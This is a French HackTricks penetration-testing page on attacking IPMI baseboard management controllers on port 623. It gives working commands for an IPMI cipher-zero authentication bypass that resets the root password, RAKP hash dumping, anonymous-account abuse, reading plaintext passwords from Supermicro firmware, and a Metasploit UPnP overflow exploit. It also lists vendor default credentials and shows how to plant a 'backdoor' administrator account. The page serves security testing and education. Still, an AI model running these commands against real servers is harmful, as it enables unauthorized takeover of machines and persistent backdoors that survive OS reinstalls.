## 623/UDP/TCP - IPMI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de cybers√©curit√©? Voulez-vous voir votre entreprise annonc√©e dans HackTricks? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

[Intelligent Platform Management Interface](https://www.thomas-krenn.com/en/wiki/IPMI\_Basics) (`IPMI`) est un ensemble de sp√©cifications normalis√©es pour les syst√®mes de gestion de l'h√¥te bas√©s sur le mat√©riel utilis√©s pour la gestion et la surveillance du syst√®me. Il agit comme un sous-syst√®me autonome et fonctionne ind√©pendamment du BIOS, du CPU, du micrologiciel et du syst√®me d'exploitation sous-jacent de l'h√¥te. IPMI permet aux administrateurs syst√®me de g√©rer et de surveiller les syst√®mes m√™me s'ils sont √©teints ou dans un √©tat non r√©actif. Il fonctionne en utilisant une connexion r√©seau directe au mat√©riel du syst√®me et ne n√©cessite pas d'acc√®s au syst√®me d'exploitation via une coquille de connexion. IPMI peut √©galement √™tre utilis√© pour des mises √† niveau √† distance des syst√®mes sans n√©cessiter d'acc√®s physique √† l'h√¥te cible. IPMI est g√©n√©ralement utilis√© de trois mani√®res :

* Avant le d√©marrage du syst√®me d'exploitation pour modifier les param√®tres du BIOS
* Lorsque l'h√¥te est compl√®tement √©teint
* Acc√®s √† un h√¥te apr√®s une panne du syst√®me

Lorsqu'il n'est pas utilis√© pour ces t√¢ches, IPMI peut surveiller une gamme de choses diff√©rentes telles que la temp√©rature du syst√®me, la tension, l'√©tat du ventilateur et les alimentations √©lectriques. Il peut √©galement √™tre utilis√© pour interroger les informations d'inventaire, examiner les journaux mat√©riels et alerter en utilisant SNMP. Le syst√®me h√¥te peut √™tre √©teint, mais le module IPMI n√©cessite une source d'alimentation et une connexion LAN pour fonctionner correctement.

Le protocole IPMI a √©t√© publi√© pour la premi√®re fois par Intel en 1998 et est maintenant pris en charge par plus de 200 fournisseurs de syst√®mes, notamment Cisco, Dell, HP, Supermicro, Intel, et plus encore. Les syst√®mes utilisant la version 2.0 d'IPMI peuvent √™tre administr√©s via une liaison s√©rie sur LAN, ce qui donne aux administrateurs syst√®me la possibilit√© de visualiser la sortie de la console s√©rie en bande. Pour fonctionner, IPMI n√©cessite les composants suivants :

* Contr√¥leur de gestion de carte m√®re (BMC) - un microcontr√¥leur et un composant essentiel d'un IPMI
* Bus de gestion de ch√¢ssis intelligent (ICMB) - une interface qui permet la communication d'un ch√¢ssis √† un autre
* Bus de gestion de plate-forme intelligente (IPMB) - √©tend le BMC
* M√©moire IPMI - stocke des choses telles que le journal des √©v√©nements syst√®me, les donn√©es du magasin de r√©f√©rentiel, et plus encore
* Interfaces de communication - interfaces syst√®me locales, interfaces s√©rie et LAN, ICMB et bus de gestion PCI

![](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Port par d√©faut**: 623/UDP/TCP (Il est g√©n√©ralement sur UDP mais il peut √©galement fonctionner sur TCP)

## √ânum√©ration

### D√©couverte
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Vous pouvez **identifier** la **version** en utilisant:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### Vuln√©rabilit√© - Contournement de l'authentification IPMI via le chiffrement 0

Dan Farmer a identifi√© une grave d√©faillance de la sp√©cification IPMI 2.0, √† savoir que le type de chiffrement 0, un indicateur que le client souhaite utiliser une authentification en texte clair, permet en r√©alit√© **l'acc√®s avec n'importe quel mot de passe**. Les probl√®mes de chiffrement 0 ont √©t√© identifi√©s dans les BMC HP, Dell et Supermicro, le probl√®me englobant probablement toutes les impl√©mentations IPMI 2.0.\
Notez que pour exploiter ce probl√®me, vous devez d'abord **trouver un utilisateur valide**.

Vous pouvez **identifier** ce probl√®me en utilisant:
```
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
Et vous pouvez **exploiter** ce probl√®me avec `ipmitool`:
```bash
apt-get install ipmitool #Install
#Using -C 0 any password is accepted
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list #Use Cipher 0 to dump a list of users
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 #Change the password of root
```
### Vuln√©rabilit√© - R√©cup√©ration √† distance du hachage de mot de passe √† distance de l'authentification RAKP IPMI 2.0

Essentiellement, **vous pouvez demander au serveur le hachage sal√© MD5 et SHA1 de n'importe quel nom d'utilisateur et si le nom d'utilisateur existe, ces hachages seront renvoy√©s**. Oui, aussi incroyable que cela puisse para√Ætre. Et il y a un **module Metasploit** pour tester cela (vous pouvez s√©lectionner le format de sortie en John ou Hashcat) :
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
_Remarque que pour cela, vous avez seulement besoin d'une liste de noms d'utilisateur √† brute-forcer (metasploit en contient d√©j√† une avec des noms d'utilisateur par d√©faut)._

Utilisation de `ipmitool` pour contourner l'authentification (`-c 0`) et changer le mot de passe root en abc123:
```
root@kali:~# apt-get install ipmitool
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list
ID  Name      Callin  Link Auth   IPMI Msg   Channel Priv Limit
2   root             true    true       true       ADMINISTRATOR
3   Oper1            true    true       true       ADMINISTRATOR
root@kali:~# ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123
```
### Vuln√©rabilit√© - Authentification anonyme IPMI

En plus des probl√®mes d'authentification mentionn√©s ci-dessus, Dan Farmer a not√© que de nombreux BMC sont exp√©di√©s avec un acc√®s "anonyme" activ√© par d√©faut. Cela est configur√© en d√©finissant le nom d'utilisateur du premier compte utilisateur sur une cha√Æne nulle et en d√©finissant un mot de passe nul pour correspondre. Le module _ipmi\_dumphashes_ identifiera et d√©versera les hachages de mots de passe (y compris les mots de passe vides) pour les comptes d'utilisateurs nuls. Ce compte peut √™tre difficile √† utiliser seul, mais nous pouvons utiliser `ipmitool` pour r√©initialiser le mot de passe d'un compte utilisateur nomm√© et utiliser ce compte pour acc√©der √† d'autres services :
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list

ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
1                    false  false      true      ADMINISTRATOR
2  root            false  false      true      ADMINISTRATOR
3  admin            true    true      true      ADMINISTRATOR

ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword #Change the password of the user 2 (root) to "newpassword"
```
### Vuln√©rabilit√© - Mots de passe en clair Supermicro IPMI

La sp√©cification IPMI 2.0 exige que le BMC r√©ponde aux m√©thodes d'authentification bas√©es sur HMAC telles que SHA1 et MD5. Ce processus d'authentification pr√©sente de graves faiblesses, comme le montrent les exemples pr√©c√©dents, mais n√©cessite √©galement l'acc√®s au mot de passe en clair pour calculer le hachage d'authentification. Cela signifie que le BMC doit stocker une version en clair de tous les mots de passe d'utilisateurs configur√©s quelque part dans une m√©moire non volatile. Dans le cas de Supermicro, cet emplacement change entre les versions du micrologiciel, mais se trouve soit dans `/nv/PSBlock` soit dans `/nv/PSStore`. Les mots de passe sont dispers√©s entre divers blocs binaires, mais faciles √† rep√©rer car ils suivent toujours le nom d'utilisateur. C'est un probl√®me grave pour toute organisation qui utilise des mots de passe partag√©s entre les BMC ou m√™me diff√©rents types de dispositifs.
```bash
 cat /nv/PSBlock
  admin                      ADMINpassword^TT                    rootOtherPassword!
```
### Vuln√©rabilit√© - Supermicro IPMI UPnP

Supermicro inclut un **√©couteur UPnP SSDP fonctionnant sur le port UDP 1900** dans le micrologiciel IPMI de nombreuses de ses cartes m√®res r√©centes. Sur les versions ant√©rieures √† SMT\_X9\_218, ce service ex√©cutait le SDK Intel pour les p√©riph√©riques UPnP, version 1.3.1. Cette version est vuln√©rable aux [probl√®mes divulgu√©s par Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play) en f√©vrier 2013, et une cible d'exploitation pour cette plate-forme fait partie du Metasploit Framework. Ce qui est int√©ressant dans cette attaque, c'est qu'elle **permet d'obtenir un acc√®s root complet au BMC**, ce qui est autrement difficile √† obtenir. Gardez √† l'esprit qu'un attaquant ayant un acc√®s administratif, soit sur le r√©seau, soit √† partir d'une coquille racine sur le syst√®me h√¥te, peut r√©trograder le micrologiciel d'un Supermicro BMC vers une version vuln√©rable, puis l'exploiter. Une fois que l'acc√®s **root** est **obtenu**, il est possible de **lire les informations d'identification en clair** √† partir du syst√®me de fichiers, **d'installer** des **logiciels** suppl√©mentaires et d'int√©grer des **portes d√©rob√©es** permanentes dans le BMC qui survivraient √† une r√©installation compl√®te du syst√®me d'exploitation de l'h√¥te.
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Brute Force

Notez que seul HP randomise le mot de passe lors du processus de fabrication.

| Nom du produit                                      | Nom d'utilisateur par d√©faut | Mot de passe par d√©faut                 |
| --------------------------------------------------- | ---------------------------- | --------------------------------------- |
| **HP Integrated Lights Out (iLO)**                  | Administrateur               | \<cha√Æne de 8 caract√®res al√©atoire>      |
| **Dell Remote Access Card (iDRAC, DRAC)**           | root                         | calvin                                  |
| **IBM Integrated Management Module (IMM)**          | USERID                       | PASSW0RD (avec un z√©ro)                 |
| **Fujitsu Integrated Remote Management Controller** | admin                        | admin                                   |
| **Supermicro IPMI (2.0)**                           | ADMIN                        | ADMIN                                   |
| **Oracle/Sun Integrated Lights Out Manager (ILOM)** | root                         | changeme                                |
| **ASUS iKVM BMC**                                   | admin                        | admin                                   |

## Exploitation de l'h√¥te √† partir du BMC

Une fois l'acc√®s administratif au BMC obtenu, plusieurs m√©thodes sont disponibles pour acc√©der au syst√®me d'exploitation de l'h√¥te. Le chemin le plus direct consiste √† abuser de la fonctionnalit√© KVM du BMC et √† red√©marrer l'h√¥te vers un shell root (init=/bin/sh dans GRUB) ou √† sp√©cifier un disque de secours en tant que CD-ROM virtuel et √† d√©marrer √† partir de celui-ci. Une fois un acc√®s brut au disque de l'h√¥te obtenu, il est trivial d'introduire une porte d√©rob√©e, de copier des donn√©es du disque dur ou de faire tout ce qui doit √™tre fait dans le cadre de l'√©valuation de s√©curit√©. Le gros inconv√©nient, bien s√ªr, est que l'h√¥te doit √™tre red√©marr√© pour utiliser cette m√©thode. L'acc√®s √† l'h√¥te en cours d'ex√©cution est beaucoup plus difficile et d√©pend de ce que l'h√¥te ex√©cute. Si la console physique de l'h√¥te est laiss√©e connect√©e, il devient trivial de la pirater en utilisant la fonctionnalit√© KVM int√©gr√©e. Il en va de m√™me pour les consoles s√©rie - si le port s√©rie est connect√© √† une session authentifi√©e, le BMC peut permettre √† ce port d'√™tre pirat√© en utilisant l'interface ipmitool pour la s√©rie-over-LAN (sol). Une voie qui n√©cessite encore plus de recherche consiste √† abuser de l'acc√®s au mat√©riel partag√©, tel que le bus i2c et la puce Super I/O.

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_bios.png)

![](https://blog.rapid7.com/content/images/post-images/27966/ipmi\_boot.png)

![](<../.gitbook/assets/image (202) (2).png>)

## Exploitation du BMC √† partir de l'h√¥te

Dans les situations o√π un h√¥te avec un BMC a √©t√© compromis, l'interface locale du BMC peut √™tre utilis√©e pour introduire un compte utilisateur de porte d√©rob√©e, et √† partir de l√†, √©tablir une position permanente sur le serveur. Cette attaque n√©cessite que **`ipmitool`** soit install√© sur l'h√¥te et que le support du pilote soit activ√© pour le BMC. L'exemple ci-dessous montre comment l'interface locale sur l'h√¥te, qui ne n√©cessite pas d'authentification, peut √™tre utilis√©e pour injecter un nouveau compte utilisateur dans le BMC. Cette m√©thode est universelle pour les cibles Linux, Windows, BSD et m√™me DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `port:623`

## R√©f√©rences

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
* [https://academy.hackthebox.com/module/112/section/1245](https://academy.hackthebox.com/module/112/section/1245)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
